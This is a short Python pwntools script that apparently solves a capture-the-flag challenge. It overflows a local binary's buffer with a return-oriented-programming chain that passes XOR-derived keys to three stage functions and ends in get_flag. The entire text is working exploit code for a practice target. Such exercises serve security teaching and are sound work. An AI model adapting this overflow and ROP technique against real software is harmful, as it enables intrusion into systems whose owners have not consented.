from pwn import *

p = process("./chall")
e = ELF("./chall")

pop_rdi = 0x401565
ret = 0x40101a
execute_stage1 = e.symbols['execute_stage1']
execute_stage2 = e.symbols['execute_stage2']
get_flag = e.symbols['get_flag']

p.recvuntil(b"key: ")
stage_key = int(p.recvuntil(b"\n"), 16)
#print(stage_key)

payload = b'A'*0x10 + b'B'*0x8
payload += p64(pop_rdi)+p64(stage_key^0xCAFEBABE)+p64(ret)+p64(execute_stage1)
payload += p64(pop_rdi)+p64(0xCAFEBABE^0xF00DBABE)+p64(ret)+p64(execute_stage2)
payload += p64(pop_rdi)+p64(0xF00DBABE^0x12345678)+p64(ret)+p64(get_flag)

p.sendlineafter(b"Input: ", payload)

p.interactive()